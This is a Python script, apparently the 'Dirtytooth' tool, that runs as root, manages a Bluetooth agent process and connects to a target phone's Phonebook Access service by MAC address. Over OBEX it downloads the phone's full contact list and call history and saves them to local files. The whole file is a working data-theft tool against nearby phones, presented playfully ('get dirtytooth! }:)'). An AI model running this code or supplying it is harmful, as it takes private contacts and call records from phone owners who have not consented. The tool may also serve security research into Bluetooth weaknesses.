#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import sys
import time
import psutil
import logging
import argparse
import datetime
import bluetooth
import subprocess
from nOBEX import client, headers, responses

START_PATH = '/usr/lib/dirtytooth/start'
FILES_PATH = '/root/dirtytooth/'
LOG_PATH = '/var/log/bluetooth_dev'

parser = argparse.ArgumentParser(description='Dirtytooth package',
                                 epilog="Enjoy with dirtytooth!")
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('--start', action='store_true', help='Start agent discover')
group.add_argument('--stop', action='store_true', help='Stop agent discover')
group.add_argument('--mac', help='MAC device to get dirtytooth! }:)')
args = parser.parse_args()


def get_pid():
    for proc_name in psutil.pids():
        if psutil.Process(proc_name).name() == 'dirtyagent':
            return psutil.Process(proc_name).pid
    return None


def write_file(filename, file):
    with open(FILES_PATH + filename, "w") as f:
        f.write(file)


def get_name(addr):
    return subprocess.check_output(["/usr/lib/dirtytooth/device",
                                    "name", addr], shell=False)


def connect(device_address):
    d = bluetooth.find_service(address=device_address, uuid="1130")
    if not d:
        logging.error('No Phonebook service found.')
        sys.exit(1)

    port = d[0]["port"]

    # Use the generic Client class to connect to the phone.
    c = client.Client(device_address, port)
    uuid = b'\x79\x61\x35\xf0\xf0\xc5\x11\xd8\x09\x66\x08\x00\x20\x0c\x9a\x66'
    result = c.connect(header_list=[headers.Target(uuid)])

    if not isinstance(result, responses.ConnectSuccess):
        logging.error('Failed to connect to phone.')
        sys.exit(1)

    return c


def get_file(c, src_path, filename, book=True):
    if book:
        mimetype = b'x-bt/phonebook'
    else:
        mimetype = b'x-bt/vcard'

    hdrs, file = c.get(src_path, header_list=[headers.Type(mimetype)])
    write_file(filename, file)
    logging.info('%s save!' % filename)


def main():
    logging.basicConfig(format='%(levelname)s:%(message)s',
                        filename=LOG_PATH,
                        level=logging.DEBUG)

    if args.start:
        if get_pid():
            print('Process dirtyagent is already open!')
        else:
            subprocess.call([START_PATH], shell=True)
    elif args.stop:
        pid = get_pid()
        if pid:
            p = psutil.Process(pid)
            p.terminate()
        else:
            print('Process dirtyagent doesn´t exist')
    else:
        if get_pid():
            print('Dirtytooth: Getting device info: %s' % args.mac)

            device_address = args.mac

            c = connect(device_address)

            if not os.path.isdir(FILES_PATH):
                os.mkdir(FILES_PATH)

            date = datetime.datetime.fromtimestamp(time.time()).strftime('%Y%m%d%H%M%S')

            get_file(c, "telecom/pb.vcf",
                     "%s-UTC_%s_phonebook" % (date, device_address))
            get_file(c, "telecom/cch.vcf",
                     "%s-UTC_%s_history" % (date, device_address))

            c.disconnect()
            return 0
        else:
            print('Process dirtyagent doesn´t exist')


if __name__ == "__main__":
    if os.geteuid() != 0:
        print "Dirtytooth must be executed as root."
        sys.exit(1)
    sys.exit(main())
